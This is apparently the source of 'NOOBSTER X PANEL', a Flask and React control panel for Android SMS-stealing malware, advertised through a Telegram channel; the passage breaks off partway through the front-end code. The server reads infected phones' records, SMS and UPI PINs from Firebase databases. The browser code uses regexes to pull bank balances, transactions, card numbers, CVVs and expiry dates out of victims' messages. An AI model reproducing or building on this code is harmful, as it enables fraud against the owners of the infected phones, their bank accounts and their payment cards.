from flask import Flask, Response, request, jsonify
import os
import time
import json
import re
import urllib.request
import urllib.error
from datetime import datetime

app = Flask(__name__)

# ============================================================
# CONFIG
# ============================================================
ADMIN_PASSWORD = "Noobster@2024"
TELEGRAM_CHANNEL = "https://t.me/noobsterrr"
CONTACT_USERNAME = "@Noobstar9"

# ============================================================
# SERVER-SIDE STORAGE (JSON file on disk)
# ============================================================
DATA_FILE = os.path.join(os.path.dirname(__file__), "panel_data.json")

def load_data():
    if not os.path.exists(DATA_FILE):
        return {"firebases": [], "api_keys": [], "status": {"online": True, "broadcast": ""}}
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
            if "firebases" not in d: d["firebases"] = []
            if "api_keys" not in d: d["api_keys"] = []
            if "status" not in d: d["status"] = {"online": True, "broadcast": ""}
            return d
    except:
        return {"firebases": [], "api_keys": [], "status": {"online": True, "broadcast": ""}}

def save_data(d):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2)

# ============================================================
# FIRESTORE / FIREBASE FETCH (server-side, hidden from browser)
# ============================================================
def fetch_firebase(url, key, path, timeout=10):
    u = (url or "").strip().rstrip("/")
    if not u.startswith("http"):
        u = "https://" + u
    if "firebaseio.com" not in u and "firebasedatabase.app" not in u:
        raise ValueError("Invalid Firebase URL")
    full = u + "/" + path + ".json?auth=" + (key or "").strip()
    req = urllib.request.Request(full, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            body = res.read().decode("utf-8")
            if not body or body == "null":
                return None
            return json.loads(body)
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        if e.code in (401, 403):
            raise ValueError("PERMISSION_DENIED")
        raise ValueError("HTTP " + str(e.code))
    except urllib.error.URLError as e:
        raise ValueError("NETWORK_ERROR: " + str(e.reason))
    except Exception as e:
        raise ValueError("FETCH_ERROR: " + str(e))

def firebase_put(url, key, path, data):
    u = (url or "").strip().rstrip("/")
    if not u.startswith("http"):
        u = "https://" + u
    full = u + "/" + path + ".json?auth=" + (key or "").strip()
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(full, data=body, method="PUT", headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            return json.loads(res.read().decode("utf-8") or "null")
    except urllib.error.HTTPError as e:
        raise ValueError("HTTP " + str(e.code))

def firebase_delete(url, key, path):
    u = (url or "").strip().rstrip("/")
    if not u.startswith("http"):
        u = "https://" + u
    full = u + "/" + path + ".json?auth=" + (key or "").strip()
    req = urllib.request.Request(full, method="DELETE")
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            return True
    except urllib.error.HTTPError as e:
        if e.code in (401, 403):
            raise ValueError("PERMISSION_DENIED")
        raise ValueError("HTTP " + str(e.code))

# ============================================================
# PARSE DEVICES (server-side)
# ============================================================
def parse_device(d_id, d, acc_url):
    if not isinstance(d, dict):
        return None
    sims = d.get("sims") or []
    if isinstance(sims, dict):
        sims = list(sims.values())
    if not isinstance(sims, list):
        sims = []

    battery = str(d.get("battery") or "—")
    try:
        bp = int("".join(c for c in battery if c.isdigit()) or "0")
    except:
        bp = 0

    # Robust status
    st = d.get("status")
    online = False
    if isinstance(st, bool):
        online = st
    elif isinstance(st, str):
        online = st.lower() in ("true", "1", "online", "yes")
    elif isinstance(st, (int, float)):
        online = st == 1

    last = (d.get("lastSeen") or d.get("last_seen") or d.get("lastOnline") or
            d.get("last_online") or d.get("lastActive") or d.get("last_active") or
            d.get("timestamp"))

    phone = d.get("mobNo")
    if not phone and sims:
        first = sims[0] if isinstance(sims[0], dict) else {}
        phone = first.get("phoneNumber")

    return {
        "id": d_id,
        "name": str(d.get("modelName") or d.get("model") or d.get("deviceName") or d_id),
        "battery": battery,
        "batteryPercent": bp,
        "status": online,
        "phoneNumber": str(phone or "—"),
        "android": str(d.get("androidV") or d.get("androidVersion") or "—"),
        "ip": str(d.get("ip_address") or "—"),
        "storage": str(d.get("storage") or "—"),
        "provider": str(d.get("service_provider") or "—"),
        "sims": sims,
        "upipin": str(d["upipin"]) if d.get("upipin") else None,
        "cpu": str(d.get("cpu_arch") or "—"),
        "sdk": str(d.get("sdkV") or "—"),
        "lastSeen": last,
        "_accountUrl": acc_url,
        "_accountName": d.get("_accName") or ""
    }

def parse_messages(mdata):
    out = []
    if not isinstance(mdata, dict):
        return out
    items = list(mdata.items())[-150:]
    for _, m in items:
        if not isinstance(m, dict):
            continue
        text = str(m.get("message") or m.get("body") or m.get("text") or "")
        if not text.strip():
            continue
        out.append({
            "text": text,
            "sender": str(m.get("sender") or m.get("from") or "Unknown"),
            "time": str(m.get("dateTime") or m.get("date") or "")
        })
    out.reverse()
    return out

# ============================================================
# PAGE HTML
# ============================================================
PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
<title>NOOBSTER X PANEL</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
<style>
*, :before, :after { box-sizing: border-box; border: 0 solid; margin: 0; padding: 0; }
:root { --border: #1f1f1f; --red: #dc2626; --green: #22c55e; }
html, body {
  line-height: 1.5;
  font-family: "Inter", ui-sans-serif, system-ui, sans-serif;
  -webkit-tap-highlight-color: transparent;
  -webkit-font-smoothing: antialiased;
}
body {
  background-color: #020202;
  color: #e8e8e8;
  background:
    radial-gradient(at 0% 0%, rgba(59,130,246,0.12) 0px, transparent 50%),
    radial-gradient(at 100% 0%, rgba(139,92,246,0.12) 0px, transparent 50%),
    radial-gradient(at 50% 100%, rgba(6,182,212,0.08) 0px, transparent 50%),
    #020202;
  background-attachment: fixed;
  min-height: 100vh;
}
button, input, textarea, select { font: inherit; color: inherit; background-color: transparent; border-radius: 0; }
img, svg { display: block; max-width: 100%; height: auto; }
h1,h2,h3,h4,h5,h6 { font-size: inherit; font-weight: inherit; }
a { color: inherit; text-decoration: inherit; }

.min-h-screen { min-height: 100vh; }
.flex { display: flex; }
.grid { display: grid; }
.hidden { display: none !important; }
.relative { position: relative; }
.fixed { position: fixed; }
.absolute { position: absolute; }
.inset-0 { inset: 0; }
.items-center { align-items: center; }
.items-start { align-items: flex-start; }
.justify-center { justify-content: center; }
.justify-between { justify-content: space-between; }
.flex-col { flex-direction: column; }
.flex-wrap { flex-wrap: wrap; }
.flex-1 { flex: 1; }
.flex-shrink-0 { flex-shrink: 0; }
.gap-1 { gap: .25rem; }
.gap-1\.5 { gap: .375rem; }
.gap-2 { gap: .5rem; }
.gap-2\.5 { gap: .625rem; }
.gap-3 { gap: .75rem; }
.gap-4 { gap: 1rem; }
.gap-5 { gap: 1.25rem; }
.p-1 { padding: .25rem; }
.p-1\.5 { padding: .375rem; }
.p-2 { padding: .5rem; }
.p-2\.5 { padding: .625rem; }
.p-3 { padding: .75rem; }
.p-4 { padding: 1rem; }
.p-5 { padding: 1.25rem; }
.p-6 { padding: 1.5rem; }
.p-7 { padding: 1.75rem; }
.p-8 { padding: 2rem; }
.px-2 { padding-inline: .5rem; }
.px-3 { padding-inline: .75rem; }
.px-4 { padding-inline: 1rem; }
.px-5 { padding-inline: 1.25rem; }
.px-6 { padding-inline: 1.5rem; }
.py-1 { padding-block: .25rem; }
.py-1\.5 { padding-block: .375rem; }
.py-2 { padding-block: .5rem; }
.py-2\.5 { padding-block: .625rem; }
.py-3 { padding-block: .75rem; }
.py-4 { padding-block: 1rem; }
.py-6 { padding-block: 1.5rem; }
.py-8 { padding-block: 2rem; }
.py-12 { padding-block: 3rem; }
.py-24 { padding-block: 6rem; }
.pt-2 { padding-top: .5rem; }
.pt-4 { padding-top: 1rem; }
.mt-1 { margin-top: .25rem; }
.mt-2 { margin-top: .5rem; }
.mt-3 { margin-top: .75rem; }
.mt-4 { margin-top: 1rem; }
.mt-6 { margin-top: 1.5rem; }
.mt-10 { margin-top: 2.5rem; }
.mb-1 { margin-bottom: .25rem; }
.mb-2 { margin-bottom: .5rem; }
.mb-3 { margin-bottom: .75rem; }
.mb-4 { margin-bottom: 1rem; }
.mb-5 { margin-bottom: 1.25rem; }
.mb-6 { margin-bottom: 1.5rem; }
.mb-8 { margin-bottom: 2rem; }
.ml-auto { margin-left: auto; }
.ml-2 { margin-left: .5rem; }
.mx-auto { margin-inline: auto; }
.w-full { width: 100%; }
.w-1\.5 { width: .375rem; }
.w-2 { width: .5rem; }
.w-3 { width: .75rem; }
.w-3\.5 { width: .875rem; }
.w-4 { width: 1rem; }
.w-5 { width: 1.25rem; }
.w-6 { width: 1.5rem; }
.w-7 { width: 1.75rem; }
.w-8 { width: 2rem; }
.w-9 { width: 2.25rem; }
.w-10 { width: 2.5rem; }
.w-16 { width: 4rem; }
.w-20 { width: 5rem; }
.w-80 { width: 20rem; }
.w-96 { width: 24rem; }
.w-px { width: 1px; }
.h-1\.5 { height: .375rem; }
.h-2 { height: .5rem; }
.h-3 { height: .75rem; }
.h-3\.5 { height: .875rem; }
.h-4 { height: 1rem; }
.h-5 { height: 1.25rem; }
.h-6 { height: 1.5rem; }
.h-7 { height: 1.75rem; }
.h-8 { height: 2rem; }
.h-9 { height: 2.25rem; }
.h-10 { height: 2.5rem; }
.h-16 { height: 4rem; }
.h-20 { height: 5rem; }
.h-80 { height: 20rem; }
.h-96 { height: 24rem; }
.h-full { height: 100%; }
.max-w-md { max-width: 28rem; }
.max-w-lg { max-width: 32rem; }
.max-w-2xl { max-width: 42rem; }
.max-w-screen-2xl { max-width: 96rem; }
.max-h-52 { max-height: 13rem; }
.max-h-96 { max-height: 24rem; }
.rounded { border-radius: .25rem; }
.rounded-lg { border-radius: .5rem; }
.rounded-xl { border-radius: .75rem; }
.rounded-2xl { border-radius: 1rem; }
.rounded-3xl { border-radius: 1.5rem; }
.rounded-full { border-radius: 9999px; }
.border { border: 1px solid var(--border); }
.border-b { border-bottom: 1px solid var(--border); }
.border-t { border-top: 1px solid var(--border); }
.border-dashed { border-style: dashed; }
.text-center { text-align: center; }
.text-right { text-align: right; }
.text-xs { font-size: .75rem; }
.text-sm { font-size: .875rem; }
.text-base { font-size: 1rem; }
.text-lg { font-size: 1.125rem; }
.text-xl { font-size: 1.25rem; }
.text-2xl { font-size: 1.5rem; }
.text-3xl { font-size: 1.875rem; }
.text-4xl { font-size: 2.25rem; }
.text-\[9px\] { font-size: 9px; }
.text-\[10px\] { font-size: 10px; }
.text-\[11px\] { font-size: 11px; }
.font-medium { font-weight: 500; }
.font-semibold { font-weight: 600; }
.font-bold { font-weight: 700; }
.font-black { font-weight: 900; }
.font-mono { font-family: ui-monospace, Menlo, monospace; }
.uppercase { text-transform: uppercase; }
.italic { font-style: italic; }
.tracking-tight { letter-spacing: -.025em; }
.tracking-wider { letter-spacing: .05em; }
.tracking-widest { letter-spacing: .1em; }
.truncate { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.whitespace-nowrap { white-space: nowrap; }
.break-all { word-break: break-all; }
.overflow-hidden { overflow: hidden; }
.overflow-y-auto { overflow-y: auto; }
.overflow-x-auto { overflow-x: auto; }
.cursor-pointer { cursor: pointer; }
.select-none { user-select: none; }
.select-all { user-select: all; }
.opacity-30 { opacity: .3; }
.opacity-50 { opacity: .5; }
.opacity-70 { opacity: .7; }
.text-white { color: #fff; }
.text-black { color: #000; }
.text-red-300 { color: #fca5a5; }
.text-red-400 { color: #f87171; }
.text-red-500 { color: #ef4444; }
.text-emerald-400 { color: #4ade80; }
.text-emerald-500 { color: #22c55e; }
.text-blue-400 { color: #60a5fa; }
.text-purple-400 { color: #c084fc; }
.text-amber-400 { color: #fbbf24; }
.text-yellow-500 { color: #eab308; }
.text-orange-400 { color: #fb923c; }
.text-\[\#6acfff\] { color: #6acfff; }
.text-\[\#333\] { color: #333; }
.text-\[\#444\] { color: #444; }
.text-\[\#555\] { color: #555; }
.text-\[\#666\] { color: #666; }
.text-\[\#777\] { color: #777; }
.text-\[\#888\] { color: #888; }
.text-\[\#aaa\] { color: #aaa; }
.text-\[\#ccc\] { color: #ccc; }
.bg-black { background-color: #000; }
.bg-white\/5 { background-color: rgba(255,255,255,0.05); }
.bg-white\/10 { background-color: rgba(255,255,255,0.1); }
.bg-red-600 { background-color: #dc2626; }
.bg-red-950\/20 { background-color: rgba(69,10,10,0.2); }
.bg-red-950\/30 { background-color: rgba(69,10,10,0.3); }
.bg-red-950\/40 { background-color: rgba(69,10,10,0.4); }
.bg-emerald-500 { background-color: #22c55e; }
.bg-emerald-500\/10 { background-color: rgba(34,197,94,0.1); }
.bg-emerald-500\/15 { background-color: rgba(34,197,94,0.15); }
.bg-emerald-950\/20 { background-color: rgba(2,44,34,0.2); }
.bg-emerald-950\/30 { background-color: rgba(2,44,34,0.3); }
.bg-purple-500\/10 { background-color: rgba(168,85,247,0.1); }
.bg-purple-500\/15 { background-color: rgba(168,85,247,0.15); }
.bg-purple-950\/20 { background-color: rgba(59,7,100,0.2); }
.bg-amber-500\/10 { background-color: rgba(245,158,11,0.1); }
.bg-blue-950\/60 { background-color: rgba(23,37,84,0.6); }
.bg-black\/70 { background-color: rgba(0,0,0,0.7); }
.bg-black\/80 { background-color: rgba(0,0,0,0.8); }
.bg-\[\#0a0a0a\] { background-color: #0a0a0a; }
.bg-\[\#0a0a0a\]\/80 { background-color: rgba(10,10,10,0.8); }
.bg-\[\#080808\] { background-color: #080808; }
.bg-\[\#0d0d0d\] { background-color: #0d0d0d; }
.bg-\[\#111\] { background-color: #111; }
.bg-\[\#111111\] { background-color: #111; }
.bg-\[\#131313\] { background-color: #131313; }
.bg-\[\#151515\] { background-color: #151515; }
.bg-\[\#1a1a1a\] { background-color: #1a1a1a; }
.bg-\[\#222\] { background-color: #222; }
.border-\[\#1a1a1a\] { border-color: #1a1a1a; }
.border-\[\#1f1f1f\] { border-color: #1f1f1f; }
.border-\[\#222\] { border-color: #222; }
.border-\[\#262626\] { border-color: #262626; }
.border-\[\#333\] { border-color: #333; }
.border-\[\#2a2a2a\] { border-color: #2a2a2a; }
.border-emerald-500\/25 { border-color: rgba(34,197,94,0.25); }
.border-emerald-900\/30 { border-color: rgba(6,78,59,0.3); }
.border-emerald-900\/40 { border-color: rgba(6,78,59,0.4); }
.border-purple-500\/25 { border-color: rgba(168,85,247,0.25); }
.border-purple-900\/30 { border-color: rgba(88,28,135,0.3); }
.border-red-900\/30 { border-color: rgba(127,29,29,0.3); }
.border-amber-500\/20 { border-color: rgba(245,158,11,0.2); }
.border-blue-800\/60 { border-color: rgba(30,64,175,0.6); }
.border-transparent { border-color: transparent; }
.shadow-lg { box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
.shadow-xl { box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
.shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); }
.backdrop-blur-md { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
.backdrop-blur-sm { backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); }
.blur-3xl { filter: blur(64px); }
.transition { transition: all .15s ease; }
.transition-all { transition: all .15s ease; }
.duration-200 { transition-duration: .2s; }
.duration-300 { transition-duration: .3s; }
.duration-500 { transition-duration: .5s; }
.animate-pulse { animation: pulse 2s infinite; }
.animate-spin { animation: spin 1s linear infinite; }
.animate-fade-in { animation: fadeIn 1s ease-out forwards; }
.animate-glint { animation: glint 1.5s infinite; box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc; }
.animate-fade-up { animation: fadeUp .3s ease-out; }
@keyframes spin { to { transform: rotate(360deg); } }
@keyframes pulse { 50% { opacity: .5; } }
@keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); } 100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } }
@keyframes glint { 0%,100% { transform: scale(1); opacity: 0; } 50% { transform: scale(1.5); opacity: 1; } }
@keyframes fadeUp { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
.red-gradient { background: linear-gradient(135deg, #dc2626, #c2410c); }
.glass-card { backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); background: rgba(17,17,17,0.9); border: 1px solid rgba(255,255,255,0.06); }
.grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
.grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
@media (min-width: 640px) { .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } .sm\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .sm\:grid-cols-6 { grid-template-columns: repeat(6, minmax(0, 1fr)); } }
@media (min-width: 1024px) { .lg\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .lg\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); } }
.line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
.tabular-nums { font-variant-numeric: tabular-nums; }
.z-0 { z-index: 0; }
.z-10 { z-index: 10; }
.z-40 { z-index: 40; }
.z-50 { z-index: 50; }
.sticky { position: sticky; }
.top-0 { top: 0; }
.bottom-6 { bottom: 1.5rem; }
.left-1\/2 { left: 50%; }
.-translate-x-1\/2 { transform: translateX(-50%); }
.-translate-y-1\/2 { transform: translateY(-50%); }
.top-1\/2 { top: 50%; }
.left-3 { left: .75rem; }
.right-2 { right: .5rem; }
.right-4 { right: 1rem; }
.right-1\/4 { right: 25%; }
.left-1\/4 { left: 25%; }
.bottom-0 { bottom: 0; }
.-top-1 { top: -.25rem; }
.-right-1 { right: -.25rem; }
.focus\:border-red-500:focus { border-color: #ef4444; }
.outline-none { outline: none; }
.placeholder\:text-\[\#444\]::placeholder { color: #444; }
.hover\:border-\[\#2a2a2a\]:hover { border-color: #2a2a2a; }
.hover\:border-\[\#333\]:hover { border-color: #333; }
.hover\:border-red-600\/40:hover { border-color: rgba(220,38,38,0.4); }
.hover\:bg-\[\#161616\]:hover { background-color: #161616; }
.hover\:bg-white\/5:hover { background-color: rgba(255,255,255,0.05); }
.hover\:bg-white\/10:hover { background-color: rgba(255,255,255,0.1); }
.hover\:bg-red-950\/20:hover { background-color: rgba(69,10,10,0.2); }
.hover\:bg-red-900\/60:hover { background-color: rgba(127,29,29,0.6); }
.hover\:bg-red-700:hover { background-color: #b91c1c; }
.hover\:text-white:hover { color: #fff; }
.hover\:text-\[\#888\]:hover { color: #888; }
.hover\:text-red-400:hover { color: #f87171; }
.hover\:opacity-90:hover { opacity: .9; }
.disabled\:opacity-50:disabled { opacity: .5; }
.disabled\:cursor-not-allowed:disabled { cursor: not-allowed; }

#telegramPopup {
  position: fixed; inset: 0;
  background: rgba(0,0,0,0.55);
  backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
  display: flex; justify-content: center; align-items: center;
  z-index: 99999; padding: 20px;
}
.popup-box {
  width: 100%; max-width: 380px;
  padding: 38px 28px 40px; border-radius: 40px;
  text-align: center; color: #fff;
  background: radial-gradient(circle at 30% 20%, #2b9cff, #0f5b9e 80%, #083b6b);
  box-shadow: 0 40px 70px rgba(0,0,0,0.7), 0 15px 30px rgba(0,0,0,0.5);
  animation: popup3d 0.7s cubic-bezier(0.23,1,0.32,1) forwards;
  position: relative; overflow: hidden;
}
@keyframes popup3d {
  0% { opacity: 0; transform: scale(0.7); filter: blur(8px); }
  100% { opacity: 1; transform: scale(1); filter: blur(0); }
}
.popup-box h2 { font-size: 26px; font-weight: 700; margin-bottom: 14px; }
.popup-box .sub-icon { font-size: 34px; }
.popup-box p {
  color: #e3f0ff; font-size: 17px; margin: 10px 0 22px;
  background: rgba(0,30,60,0.2); border-radius: 40px; padding: 14px 16px;
}
.join-btn {
  display: inline-block; margin-top: 6px; padding: 16px 34px;
  background: linear-gradient(145deg, #ffffff, #e0ecff);
  color: #0066aa; font-weight: 700; font-size: 18px;
  border-radius: 60px; border: none; cursor: pointer;
}
.join-btn::before { content: "✈️ "; margin-right: 8px; }
.popup-close-btn {
  position: absolute; top: 14px; right: 18px;
  background: rgba(255,255,255,0.15); border: none; color: #fff;
  font-size: 20px; width: 32px; height: 32px; border-radius: 50%;
  cursor: pointer;
}

#root { min-height: 100vh; }
</style>
</head>
<body>
<div id="root"></div>

<div id="telegramPopup" onclick="if(event.target === this) this.style.display='none';">
  <div class="popup-box">
    <button class="popup-close-btn" onclick="document.getElementById('telegramPopup').style.display='none';">&times;</button>
    <h2><span class="sub-icon">📱</span> JOIN TELEGRAM CHANNEL</h2>
    <p>Get The New Pannel<br /></p>
    <a class="join-btn" href="__TELEGRAM_CHANNEL__" target="_blank" onclick="document.getElementById('telegramPopup').style.display='none';">⚡ JOIN ⚡</a>
  </div>
</div>

<script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
<script>
const { useState, useEffect, useCallback, useMemo, useRef, Fragment } = React;
const e = React.createElement;

// ---------- CONFIG ----------
const CFG = {
  CONTACT_USERNAME: "__CONTACT_USERNAME__",
  TELEGRAM_CHANNEL: "__TELEGRAM_CHANNEL__"
};
const K_ADMIN = "nb_admin";

// ---------- API HELPERS (server-side) ----------
async function api(path, opts = {}) {
  const res = await fetch(path, {
    ...opts,
    headers: { "Content-Type": "application/json", ...(opts.headers || {}) }
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || ("HTTP " + res.status));
  return data;
}

// ---------- SMS Analysis ----------
const BANK_PATTERNS = [
  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"], [/SBIIN|SBIINB|SBI/i, "SBI"], [/ICICIB|ICICI/i, "ICICI Bank"],
  [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"], [/KOTAKB|KOTAK/i, "Kotak Bank"], [/PNBSMS|PNB/i, "PNB"],
  [/BOIIND|BOI/i, "Bank of India"], [/CANBNK|CANARA/i, "Canara Bank"], [/UNIONB|UBISMS/i, "Union Bank"],
  [/YESBNK|YESBANK/i, "Yes Bank"], [/IDBIBK|IDBI/i, "IDBI Bank"], [/INDUSB|INDUSIND/i, "IndusInd Bank"],
  [/FEDERAL|FEDBNK/i, "Federal Bank"], [/RBLBNK|RBL/i, "RBL Bank"], [/PAYTM/i, "Paytm"],
  [/PHONEPE|PHNPE/i, "PhonePe"], [/GPAY|GOOGLEPAY/i, "Google Pay"], [/AMAZONPAY/i, "Amazon Pay"],
  [/CRED/i, "CRED"], [/AIRTEL/i, "Airtel Payments"], [/JIOMNY|JIOMONEY/i, "Jio Money"]
];
const BAL_PATTERNS = [
  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i
];
const TXN_PATTERNS = [
  /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i
];
const CARD_PATTERNS = [/card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i];
const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];

function detectBank(sender) {
  for (const [re, name] of BANK_PATTERNS) if (re.test(sender)) return name;
  return sender || "Bank";
}
function detectBankSMS(text, sender) {
  if (!text || text.trim().length < 8) return null;
  const hasKw = /AVL|AVAL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|A\/C|ACCOUNT|INR/i.test(text);
  if (!hasKw) return null;
  let balance = null;
  for (const re of BAL_PATTERNS) { const m = text.match(re); if (m && m[1]) { balance = m[1].replace(/,/g, ""); break; } }
  if (!balance) return null;
  let amount = null;
  for (const re of TXN_PATTERNS) { const m = text.match(re); if (m && m[1] && m[1].replace(/,/g, "") !== balance) { amount = m[1].replace(/,/g, ""); break; } }
  let type = null;
  if (/credit(?:ed)?/i.test(text)) type = "credit";
  else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) type = "debit";
  return { bankName: detectBank(sender), senderName: sender || "Unknown", availableBalance: balance, transactionAmount: amount, transactionType: type, rawSms: text };
}
function detectCard(text) {
  if (!text) return null;
  if (!/CARD|CVV|CREDIT|DEBIT/.test(text.toUpperCase())) return null;
  let last4 = null;
  for (const re of CARD_PATTERNS) { const m = text.match(re); if (m && m[1]) { const d = m[1].replace(/[^0-9]/g, ""); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
  if (!last4) return null;
  let cardType = "";
  if (/VISA/i.test(text)) cardType = "VISA";
  else if (/MASTER/i.test(text)) cardType = "Mastercard";
  else if (/RUPAY/i.test(text)) cardType = "RuPay";
  let cvv = "", expiry = "";
  for (const re of CVV_PATTERNS) { const m = text.match(re); if (m && m[1]) { cvv = m[1]; break; } }
  for (const re of EXP_PATTERNS) { const m = text.match(re); if (m && m[1]) { expiry = m[1]; break; } }
  return { cardLast4: last4, cardType, cvv: cvv || undefined, expiry: expiry || undefined, rawSms: text };
}
function analyzeSMS(messages) {
  const bankBalances = [], cards = [];
  messages.forEach(m => {
    const b = detectBankSMS(m.text, m.sender);
    if (b) bankBalances.push(b);
    const c = detectCard(m.text);
    if (c) cards.push(c);
  });
  return { bankBalances, cards };
}

// ---------- Icons ----------
const Icon = ({ name, size = 16, className = "" }) => {
  const P = {
    wifi: e(Fragment, null, e("path", { d: "M12 20h.01" }), e("path", { d: "M2 8.82a15 15 0 0 1 20 0" }), e("path", { d: "M5 12.859a10 10 0 0 1 14 0" }), e("path", { d: "M8.5 16.429a5 5 0 0 1 7 0" })),
    copy: e(Fragment, null, e("rect", { width: 14, height: 14, x: 8, y: 8, rx: 2 }), e("path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" })),
    x: e(Fragment, null, e("path", { d: "M18 6 6 18" }), e("path", { d: "m6 6 12 12" })),
    plus: e(Fragment, null, e("path", { d: "M5 12h14" }), e("path", { d: "M12 5v14" })),
    trash: e(Fragment, null, e("path", { d: "M10 11v6" }), e("path", { d: "M14 11v6" }), e("path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6" }), e("path", { d: "M3 6h18" }), e("path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" })),
    refresh: e(Fragment, null, e("path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" }), e("path", { d: "M21 3v5h-5" }), e("path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" }), e("path", { d: "M8 16H3v5" })),
    logout: e(Fragment, null, e("path", { d: "m16 17 5-5-5-5" }), e("path", { d: "M21 12H9" }), e("path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" })),
    shield: e("path", { d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" }),
    clock: e(Fragment, null, e("path", { d: "M12 6v6l4 2" }), e("circle", { cx: 12, cy: 12, r: 10 })),
    rupee: e(Fragment, null, e("path", { d: "M6 3h12" }), e("path", { d: "M6 8h12" }), e("path", { d: "m6 13 8.5 8" }), e("path", { d: "M6 13h3" }), e("path", { d: "M9 13c6.667 0 6.667-10 0-10" })),
    card: e(Fragment, null, e("rect", { width: 20, height: 14, x: 2, y: 5, rx: 2 }), e("line", { x1: 2, x2: 22, y1: 10, y2: 10 })),
    send: e(Fragment, null, e("path", { d: "M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z" }), e("path", { d: "m21.854 2.147-10.94 10.939" })),
    phone: e("path", { d: "M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" }),
    msg: e("path", { d: "M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z" }),
